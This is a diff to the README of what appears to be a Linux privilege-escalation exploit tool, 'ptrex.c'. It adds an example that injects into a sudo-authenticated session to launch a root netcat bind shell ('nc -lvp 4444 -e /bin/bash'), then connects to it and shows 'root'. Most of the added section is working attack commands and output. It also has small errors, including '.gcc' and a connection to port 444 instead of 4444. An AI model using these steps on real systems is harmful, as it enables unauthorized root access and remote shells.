@@ -167,6 +167,36 @@ bash-5.0# whoami
 root
 bash-5.0#
 ```
+
+### Example ptrex.c bind shell
+
+This example needs netcat installed in the machine
+
+Open a terminal with a sudo user group
+
+execute any command with sudo and enter the password, ex:
+```
+dreg@fr33project:~$ tty
+/dev/pts/4
+dreg@fr33project:~$ id
+uid=1003(dreg) gid=1003(dreg) groups=1003(dreg),27(sudo)
+dreg@fr33project:~$ sudo whoami
+[sudo] password for dreg:
+root
+dreg@fr33project:~$ 
+```
+
+open other terminal with the same user and execute ./ptrex
+```
+dreg@fr33project:~$ tty
+/dev/pts/7
+dreg@fr33project:~$ .gcc -o ptrex ptrex.c
+dreg@fr33project:~$ ./ptrex /usr/bin/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
+dreg@fr33project:~$ nc 127.0.0.1 444
+whoami
+root
+```
+
 ## WORKING ON:
 
 * Parrot Home/Workstation: 4.6 
